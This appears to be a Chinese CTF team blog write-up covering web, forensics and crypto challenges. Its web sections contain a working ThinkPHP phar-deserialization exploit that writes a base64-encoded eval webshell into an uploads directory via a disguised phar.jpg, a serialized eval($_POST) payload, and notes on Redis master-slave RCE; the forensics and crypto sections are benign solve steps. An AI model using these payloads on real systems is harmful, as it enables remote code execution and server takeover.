<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Prophecy</span>\<span class="title">Argument</span>\<span class="title">Token</span>\<span class="title">ExactValueToken</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pipes</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span> <span class="keyword">extends</span> <span class="title">Pipes</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = [<span class="keyword">new</span> ExactValueToken()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Prophecy</span>\<span class="title">Argument</span>\<span class="title">Token</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Output</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ExactValueToken</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$value</span>=<span class="string">&#x27;jiang&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$string</span>=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$util</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;util = <span class="keyword">new</span> Output();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">console</span>;<span class="comment">#Output</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>\<span class="title">Memcached</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Output</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$handle</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$styles</span> = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> Memcached();<span class="comment">//目的调用其write()</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;styles = [<span class="string">&#x27;stringify&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>;<span class="comment">#Memcached</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>\<span class="title">File</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Memcached</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$handler</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handler = <span class="keyword">new</span> File();<span class="comment">//目的调用File-&gt;set()</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>;<span class="comment">#File</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$options</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$tag</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;options = [</span><br><span class="line">        <span class="string">&#x27;expire&#x27;</span>        =&gt; <span class="number">0</span>,</span><br><span class="line">        <span class="string">&#x27;cache_subdir&#x27;</span>  =&gt; <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&#x27;prefix&#x27;</span>        =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;path&#x27;</span>          =&gt; <span class="string">&#x27;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../../../../../../../../../var/www/html/public/uploads/a.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">        ];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;tag = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="variable">$o</span>=<span class="keyword">new</span> Windows();</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> \Phar(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; startBuffering();</span><br><span class="line"><span class="variable">$phar</span> -&gt; setStub(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> -&gt; setMetadata(<span class="variable">$o</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; addFromString(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; stopBuffering();</span><br><span class="line">\rename(<span class="string">&#x27;phar.phar&#x27;</span>,<span class="string">&#x27;phar.jpg&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在头像处上传后可以获取图片存储位置。</p>
<p>触发phar协议。</p>
<p>然后<img data-src="https://j1ang.oss-cn-hangzhou.aliyuncs.com/img/1632382502937-30e42575-35ee-4300-9ab9-3eff71801531.png" alt="image.png"></p>
<p>参考：</p>
<p><a href="https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-5.x-%E6%BC%8F%E6%B4%9E/Thinkphp-=-5.0.10-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html">https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-5.x-%E6%BC%8F%E6%B4%9E/Thinkphp-=-5.0.10-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html</a></p>
<h2 id="Web-easy-eval"><a href="#Web-easy-eval" class="headerlink" title="Web-easy_eval"></a>Web-easy_eval</h2><p>简单反序列化</p>
<p><code>O:1:&quot;b&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;a&quot;:2:&#123;s:4:&quot;code&quot;;s:20:&quot;eval($_POST[%27cmd%27]);&quot;;&#125;&#125;</code> 小写绕过。</p>
<p>看了 phpinfo </p>
<p>没办法 bypass bf。</p>
<p>看到当前文件夹下有个 <code>.config.php.swp</code></p>
<p><img data-src="https://j1ang.oss-cn-hangzhou.aliyuncs.com/img/1632385942528-e424da5e-da49-402a-9289-3ed2bbd947ca.png" alt="image.png"></p>
<p>那就是打redis了。</p>
<p>redis 的rce 除了写木马，定时任务，就是主从复制rce了。</p>
<p>定时任务又只能写在 centos 系统的，此环境不合适。</p>
<p>redis外网无法访问，只能被动连接 ，先搭建恶意服务器。</p>
<p>使用蚁剑的工具。</p>
<p><img data-src="https://j1ang.oss-cn-hangzhou.aliyuncs.com/img/1632386092674-6f65800a-0b06-472a-8202-c3773b083c53.png" alt="image.png"></p>
<p><img data-src="https://j1ang.oss-cn-hangzhou.aliyuncs.com/img/1632386641769-682c576f-51ee-4a81-9027-f6826571b52e.png" alt="image.png"></p>
<p><a href="https://blog.csdn.net/qq_41891666/article/details/107103116">https://blog.csdn.net/qq_41891666/article/details/107103116</a></p>
<p><a href="https://github.com/Dliv3/redis-rogue-server">https://github.com/Dliv3/redis-rogue-server</a></p>
<h2 id="Misc-Browser"><a href="#Misc-Browser" class="headerlink" title="Misc-Browser"></a>Misc-Browser</h2><blockquote>
<p>附件链接如下<br>天翼云盘： <a href="https://cloud.189.cn/web/share?code=nEnQFvVzYr22">https://cloud.189.cn/web/share?code=nEnQFvVzYr22</a><br>百度网盘： <a href="https://pan.baidu.com/s/1v4nS6EjRUOwj7A25_ocw_A">https://pan.baidu.com/s/1v4nS6EjRUOwj7A25_ocw_A</a></p>
<p>百度网盘提取码: xsct</p>
<p>flag由三个部分组成：</p>
<p>1.默认浏览器(请给出在注册表中可证明它是默认浏览器的对应的值，如：IE.HTTP)<br>2.默认浏览器版本(如：11.0.9600.18978)<br>3.默认浏览器中用户浏览次数最多的URL（如：<a href="https://www.bilibili.com/">https://www.bilibili.com/</a>)</p>
<p>三部分使用 _ 进行拼接，拼接如下：</p>
<p>IE.HTTP_11.0.9600.18978_<a href="https://www.bilibili.com/">https://www.bilibili.com/</a></p>
<p>拼接后将以上所得字符串进行MD5，即为flag，最终格式为flag{XXXXXX}</p>
</blockquote>
<p>经典的取证题，注册表取证+内存取证</p>
<h3 id="默认浏览器"><a href="#默认浏览器" class="headerlink" title="默认浏览器"></a>默认浏览器</h3><p>在Windows 10中，默认的应用程序处理是通过键<code>UserChoice</code>来进行修改。</p>
<p>没有默认浏览器，只有http、https等协议的默认处理程序。理论上，你可以将不安全的浏览器和“安全的”浏览器分开;但一般来说，默认的HTTP处理程序可能是web浏览器。</p>
<p>考察默认浏览器注册表路径，values为<code>MSEdgeHTM</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http｜https\UserChoice</span><br></pre></td></tr></table></figure>

<p><img data-src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20210923112228409.png" alt="image-20210923112228409"></p>
<p>这里还有一个常见的注册表值，但是也不一定是默认浏览器。</p>
<p><img data-src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20210923121319839.png" alt="image-20210923121319839"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;C:\Program Files\Microsoft\Edge\Application\msedge.exe&quot; --single-argument %1</span><br></pre></td></tr></table></figure>

<p>在以下有一些关于默认浏览器注册表的讨论</p>
<p><a href="https://stackoverflow.com/questions/32354861/how-to-find-the-default-browser-via-the-registry-on-windows-10">https://stackoverflow.com/questions/32354861/how-to-find-the-default-browser-via-the-registry-on-windows-10</a></p>
<h3 id="版本号"><a href="#版本号" class="headerlink" title="版本号"></a>版本号</h3><p><img data-src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20210923114240368.png" alt="image-20210923114240368"></p>
<p>92.0.902.78</p>
<p>内存中也可以找到版本号，非常明显</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 vol.py -f Browser.raw --profile=Win7SP1x86_23418 filescan | grep &quot;Edge&quot;</span><br></pre></td></tr></table></figure>

<h3 id="历史记录"><a href="#历史记录" class="headerlink" title="历史记录"></a>历史记录</h3><p>我们直接去找History文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 vol.py -f Browser.raw --profile=Win7SP1x86_23418 filescan | grep &quot;History&quot;</span><br><span class="line">\Device\HarddiskVolume1\Users\HP\AppData\Local\Microsoft\Edge\User Data\Default\History</span><br><span class="line"></span><br><span class="line">python2 vol.py -f Browser.raw --profile=Win7SP1x86_23418 dumpfiles -Q 0x000000007da2abf0  -D ctf/</span><br></pre></td></tr></table></figure>

<p><img data-src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20210923182128521.png" alt="image-20210923182128521"></p>
<h4 id="DB-Browser"><a href="#DB-Browser" class="headerlink" title="DB Browser"></a>DB Browser</h4><p><img data-src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20210923182356877.png" alt="image-20210923182356877"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;C:\Program Files\Microsoft\Edge\Application\msedge.exe&quot; --single-argument %1_92.0.902.78_https://weibo.com/login.php</span><br><span class="line"></span><br><span class="line">MSEdgeHTM_92.0.902.78_https://weibo.com/login.php</span><br></pre></td></tr></table></figure>

<h2 id="Crypto-TryHash（recuring）"><a href="#Crypto-TryHash（recuring）" class="headerlink" title="Crypto-TryHash（recuring）"></a>Crypto-TryHash（recuring）</h2><p>明明是TEA，装什么hash</p>
<p>从维基百科上偷来的图</p>
<p><img data-src="https://upload.wikimedia.org/wikipedia/commons/a/a1/TEA_InfoBox_Diagram.png" alt="File:TEA InfoBox Diagram.png - Wikimedia Commons"></p>
<p>我们有最多四次的加密机会，加密相同的<code>nounce</code>，这里<code>nounce</code>就是明文，需要获得<code>key</code>为<code>Iamthesuperadmin</code>的密文</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myhash</span>(<span class="params">msg, identification</span>):</span></span><br><span class="line">    delta = <span class="number">0x9E3779B9</span></span><br><span class="line">    v0, v1 = <span class="built_in">map</span>(uint32, unpack(<span class="string">&#x27;&gt;2I&#x27;</span>, msg))</span><br><span class="line">    k0, k1, k2, k3 = <span class="built_in">map</span>(uint32, unpack(<span class="string">&#x27;&gt;4I&#x27;</span>, identification))</span><br><span class="line">    sm, delta = uint32(<span class="number">0</span>), uint32(delta)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        sm.value += delta.value</span><br><span class="line">        v0.value += ((v1.value &lt;&lt; <span class="number">4</span>) + k0.value) ^ (v1.value + sm.value) ^ ((v1.value &gt;&gt; <span class="number">5</span>) + k1.value)</span><br><span class="line">        v1.value += ((v0.value &lt;&lt; <span class="number">4</span>) + k2.value) ^ (v0.value + sm.value) ^ ((v0.value &gt;&gt; <span class="number">5</span>) + k3.value)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> pack(<span class="string">&#x27;&gt;2I&#x27;</span>, v0.value, v1.value)</span><br></pre></td></tr></table></figure>

<p>找到了一篇<code>related key</code>的论文</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210923123147357.png" alt="image-20210923123147357"></p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210923123215428.png" alt="image-20210923123215428"></p>
<p>老韩出了，太简单了，我竟然没想到，不过这么简单，也隔了好么久才有人出，都被攻击流程给吸引过去了吧？前面出的人比较少，后面就多起来了</p>
<p>具体的不多说了，总之不是考攻击手法，就是考一下流程</p>
<p>TEA解密get，CTF真好玩</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_letters, digits</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> c_uint32 <span class="keyword">as</span> uint32</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack, unpack</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh = remote(<span class="string">&#x27;8.134.37.86&#x27;</span>, <span class="number">28204</span>)</span><br><span class="line">space = ascii_letters + digits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work1</span>():</span></span><br><span class="line">    <span class="comment"># sha256(XXXX+9Bh7wL1Gd3Xvj1L6) == 89294055ff0e9581e25802cd7374448078c81867d91a0a8ca531f22b84cb6394</span></span><br><span class="line">    proof = sh.recvuntil(<span class="string">b&#x27;Give me XXXX:&#x27;</span>)</span><br><span class="line">    tail = proof[<span class="number">12</span>:<span class="number">28</span>].decode()</span><br><span class="line">    HASH = proof[<span class="number">33</span>:<span class="number">97</span>].decode()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> product(space, repeat=<span class="number">4</span>):</span><br><span class="line">        head = <span class="string">&#x27;&#x27;</span>.join(i)</span><br><span class="line">        t = hashlib.sha256((head+tail).encode()).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> t == HASH:</span><br><span class="line">            sh.sendline(head.encode())</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work2</span>():</span></span><br><span class="line">    <span class="comment"># SHA-256(?+9grdX7Jcp1YGQQgo) == 31855f728b438952317f20b732181fc43a12e2ff058f4aab4e0a54781e204eca</span></span><br><span class="line">    tail = <span class="string">&#x27;aSNJw6WNPYK32RpR&#x27;</span></span><br><span class="line">    HASH = <span class="string">&#x27;7fa793e26380c281cc48eb6b335cee79fdcafd8355c69e1181541fc513604201&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> product(space, repeat=<span class="number">4</span>):</span><br><span class="line">        head = <span class="string">&#x27;&#x27;</span>.join(i)</span><br><span class="line">        t = hashlib.sha256((head+tail).encode()).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> t == HASH:</span><br><span class="line">           <span class="built_in">print</span>(head)</span><br><span class="line">           <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tea_encrypt</span>(<span class="params">msg, identification</span>):</span></span><br><span class="line">    delta = <span class="number">0x9E3779B9</span></span><br><span class="line">    v0, v1 = <span class="built_in">map</span>(uint32, unpack(<span class="string">&#x27;&gt;2I&#x27;</span>, msg))</span><br><span class="line">    k0, k1, k2, k3 = <span class="built_in">map</span>(uint32, unpack(<span class="string">&#x27;&gt;4I&#x27;</span>, identification))</span><br><span class="line">    sm, delta = uint32(<span class="number">0</span>), uint32(delta)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        sm.value += delta.value</span><br><span class="line">        v0.value += ((v1.value &lt;&lt; <span class="number">4</span>) + k0.value) ^ (v1.value + sm.value) ^ ((v1.value &gt;&gt; <span class="number">5</span>) + k1.value)</span><br><span class="line">        v1.value += ((v0.value &lt;&lt; <span class="number">4</span>) + k2.value) ^ (v0.value + sm.value) ^ ((v0.value &gt;&gt; <span class="number">5</span>) + k3.value)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> pack(<span class="string">&#x27;&gt;2I&#x27;</span>, v0.value, v1.value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tea_decrypt</span>(<span class="params">cipher, key</span>):</span></span><br><span class="line">    delta = <span class="number">0x9E3779B9</span></span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0xC6EF3720</span></span><br><span class="line">    v0, v1 = <span class="built_in">map</span>(uint32, unpack(<span class="string">&#x27;&gt;2I&#x27;</span>, cipher))</span><br><span class="line">    k0, k1, k2, k3 = <span class="built_in">map</span>(uint32, unpack(<span class="string">&#x27;&gt;4I&#x27;</span>, key))</span><br><span class="line">    <span class="built_in">sum</span>, delta = uint32(<span class="built_in">sum</span>), uint32(delta)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        v1.value -= ((v0.value &lt;&lt; <span class="number">4</span>) + k2.value) ^ (v0.value + <span class="built_in">sum</span>.value) ^ ((v0.value &gt;&gt; <span class="number">5</span>) + k3.value)</span><br><span class="line">        v0.value -= ((v1.value &lt;&lt; <span class="number">4</span>) + k0.value) ^ (v1.value + <span class="built_in">sum</span>.value) ^ ((v1.value &gt;&gt; <span class="number">5</span>) + k1.value)</span><br><span class="line">        <span class="built_in">sum</span>.value -= delta.value</span><br><span class="line">    <span class="keyword">return</span> pack(<span class="string">&#x27;&gt;2I&#x27;</span>, v0.value, v1.value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">proof_of_work1()</span><br><span class="line">adminpass = <span class="string">b&#x27;Iamthesuperadmin&#x27;</span></span><br><span class="line">identification = <span class="string">b&#x27;IamthesuperadmiN&#x27;</span></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Choice:&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;I can hash for you&#x27;</span>)</span><br><span class="line">sh.sendline(identification)</span><br><span class="line">c = sh.recvline()[:-<span class="number">1</span>]</span><br><span class="line">nounce = tea_decrypt(c, identification)</span><br><span class="line"><span class="built_in">print</span>(nounce)</span><br><span class="line">payload = tea_encrypt(nounce, adminpass)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Choice:&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Are you admin?&#x27;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recv()</span><br></pre></td></tr></table></figure>

<h2 id="Crypto-MyCipher（unsolved）"><a href="#Crypto-MyCipher（unsolved）" class="headerlink" title="Crypto-MyCipher（unsolved）"></a>Crypto-MyCipher（unsolved）</h2><p>感觉很上次那道很像，但是不知道怎么做，写了个解密函数，没有研究f和g怎么逆</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt_ecb</span>(<span class="params">msg, key</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(msg) % <span class="number">4</span> == <span class="number">0</span></span><br><span class="line">    plaintext = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(msg), <span class="number">4</span>):</span><br><span class="line">        plaintext += decrypt(msg[i:i + <span class="number">4</span>], key)</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">msg, key</span>):</span></span><br><span class="line">    subkeys = unpack(<span class="string">&#x27;&gt;4H&#x27;</span>, key)</span><br><span class="line">    left, right = unpack(<span class="string">&#x27;&gt;2H&#x27;</span>, msg)</span><br><span class="line">    left = right ^ left</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        right = left</span><br><span class="line">        tmp = left ^ f(subkeys[<span class="number">2</span> - i] ^ right)</span><br><span class="line">        left = tmp</span><br><span class="line">    left = left ^ subkeys[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">return</span> pack(<span class="string">&#x27;&gt;2H&#x27;</span>, right, left)</span><br></pre></td></tr></table></figure>

<h2 id="Crypto-babypack（unsolved）"><a href="#Crypto-babypack（unsolved）" class="headerlink" title="Crypto-babypack（unsolved）"></a>Crypto-babypack（unsolved）</h2><p>比赛时没怎么看，有空再看吧</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
      <tags>
        <tag>团队WP</tag>
      </tags>
  </entry>
  <entry>
    <title>20210920 CTFSHOW月饼杯Crypto方向WP</title>
    <url>/posts/eabdfebd/</url>
    <content><![CDATA[<p>艹是真的卡</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210921164717044.png" alt="image-20210921164717044"></p>
<p>kw呜呜呜，苦露西</p>
<span id="more"></span>

<h1 id="月饼杯"><a href="#月饼杯" class="headerlink" title="月饼杯"></a>月饼杯</h1><h2 id="Crypto-我的木头啊！！！"><a href="#Crypto-我的木头啊！！！" class="headerlink" title="Crypto-我的木头啊！！！"></a>Crypto-我的木头啊！！！</h2><blockquote>
<p>我的宝贝木头怎么被别人拿去做了栅栏，该怎么让他把我的宝贝木头换回来</p>
</blockquote>
<blockquote>
<p>c6_I_@t216MG_0q_Uf673JTYYzBXs{31QJmTTg=hw63XZFZiHho5GzE} </p>
</blockquote>
<p>W型栅栏 6</p>
<blockquote>
<p>ctfshow{626173653136_MJQXGZJTGI_YmFzZTY0_qzTiEHgB_@UX=h}</p>
</blockquote>
<blockquote>
<p>ctfshow{base16_base32_base64_base58_base}</p>
</blockquote>
<h2 id="Crypto-切记务必一定要简单（recuring）"><a href="#Crypto-切记务必一定要简单（recuring）" class="headerlink" title="Crypto-切记务必一定要简单（recuring）"></a>Crypto-切记务必一定要简单（recuring）</h2><blockquote>
<p>在分解模数N的时候，除了yafu、factorDB之类现成的工具，我们还要学习一些<a href="https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_module_attack">经典算法</a>背后的思想</p>
</blockquote>
<p>做个<img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/006D7C42.png" alt="img"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">N = <span class="number">2537578464060405716805986209629349306801585799475566769629753550869939275098596985321844853409568013133264210149682740766024366488982429837531169509250859483526118776072099712258599263748732430570800661306460224380741403478451009927665855604092871949705081574682507168392533782265954982321389235080917435497979848348321877319477780053855288297818739223795823021264136388271573286209636548206594797813576810688640228747147522219625866870777713858310084857747151891233766790129427051420839675334815589489194938107230004427317376438129284740257550482956744843496127593401991789197386269415091390162278183972481279010769071314265529328954115911712467352483233380953386631332500882467</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">1595212140002311449986774328911538131302021292459414446518934463751924694901681197719356391632660947700772362140375795419149621042035212501260054901239960931458611414432758551692762707025705203714868544808208482382713403084945106505851948109261999900909705955010772382362799626266428855540493176898287751627555377040483120618564113186968911259319525250268854097054159722810266326281435235140862840574780793343440289233893489065111751815693510473980454574606688640074455096644717769189843656600438932454630073349737743755427817726253307163184245099133341515200474243399626081459226215410055396366269535409932990065250476999485239927630147382130648035686165068584532121265385100009</span></span><br></pre></td></tr></table></figure>

<p>我以后再也不相信签到题了</p>
<hr>
<p>好家伙这道题是有源码的啊？？？这一天天魂不守舍得坐这里（不对（小声）我记得一开始是没有源码的）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random, sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_prime</span>(<span class="params">base, offset</span>):</span></span><br><span class="line">    l = base - (<span class="number">1</span> &lt;&lt; offset)</span><br><span class="line">    r = base + (<span class="number">1</span> &lt;&lt; offset)</span><br><span class="line">    p = random.randrange(l, r) | <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">not</span> isPrime(p)):</span><br><span class="line">        p += <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    p = getPrime(<span class="number">1127</span>)</span><br><span class="line">    q0 = p * <span class="number">13</span> // <span class="number">17</span></span><br><span class="line">    q = get_prime(q0, <span class="number">573</span>) <span class="comment"># Konami</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        flag = bytes_to_long(f.read())</span><br><span class="line">    N = p * q</span><br><span class="line">    <span class="keyword">assert</span> isPrime(p) <span class="keyword">and</span> isPrime(q) <span class="keyword">and</span> flag &lt; N</span><br><span class="line">    e = <span class="number">0x10001</span></span><br><span class="line">    c = <span class="built_in">pow</span>(flag, e, N)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;N = <span class="subst">&#123;N&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>整体代码比较短，p是1127位的素数，q与p有关，是$[\lfloor13p/17\rfloor-2^{573},\ \lfloor13p/17\rfloor+2^{573}]$中的一个质数，好吧给我源码也不会</p>
<p>来预习一下大整数分解的算法，之前都是直接跑工具的，参考<a href="https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_module_attack/">https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_module_attack/</a></p>
